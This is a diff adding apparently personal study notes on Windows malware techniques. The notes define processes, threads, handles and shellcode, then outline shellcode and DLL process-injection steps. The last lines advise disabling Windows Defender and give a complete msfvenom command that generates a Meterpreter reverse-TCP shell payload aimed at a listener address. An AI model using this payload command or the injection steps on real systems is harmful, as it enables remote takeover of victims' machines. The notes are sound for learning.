@@ -1,0 +1,30 @@
+Process= Is an instance of a running program. 
+Threads=Is the execution context inside a Process. A process has many threads that share memory and resources. Attacks thread injection/ Hijacking.
+Handle= Is an opaque reference the OS gives a program to access a resource
+Shellcode= small in memory payload intended for execution.
+Win32 API= Is just an interface that allows to communicate with the OS.
+
+
+Modern Shellcodes:
+a. Spawn a shell 
+b. Download/execute
+c. Reverse Shell
+d. Loader for larger payloads
+
+
+PROCESS injection
+-Inject something we want to run into a target process(pID).
+-Every process has a Process ID.
+a. Shellcode injection
+-Get a handle to our process
+- Allocate memory to our shellcode
+- Write to the process memory
+- Create remote thread
+b. DLL injection
+- Loading our own library to an existing process.
+
+
+a) Shellcode
+- Generate in kali linux.
+- DIsable windows defender(for now).
+kali> msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=443 EXITFUNC=thread -f c --var-name=payload
